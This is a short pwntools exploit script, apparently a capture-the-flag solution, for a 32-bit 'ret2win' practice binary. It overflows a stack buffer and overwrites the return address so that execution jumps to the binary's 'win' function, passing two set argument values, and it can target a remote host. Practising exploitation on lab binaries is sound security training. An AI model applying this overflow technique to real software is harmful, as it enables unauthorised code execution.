#!/usr/bin/env python3

from pwn import *

TARGET = './ret2win_32'
HOST = ''
PORT = 1337

elf = ELF(TARGET)

context.arch = 'amd64'
gdb_script = f"""
  b *main
  c
"""
# context.log_level = 'DEBUG'

if args.GDB:
  # context.terminal = ['tmux', 'splitw', '-h']  
  context.terminal = [
    'wt.exe', '-w', '0', 'new-tab', '--', 'bash', '-lc'
  ]
  p = gdb.debug(TARGET, gdbscript=gdb_script)
elif not args.REMOTE:
  p = process(TARGET)
else:
  p = remote(HOST, PORT)

# ===================================== #

win = elf.symbols['win']
payload = b'A' * 40 + b'B' * 4 + p32(win) + p32(0xbababebe) + p32(0xbaadc0de)
p.sendlineafter(b'Input: ', payload)


p.interactive()

# NOTE:
# ret2win 32 bit w param checker

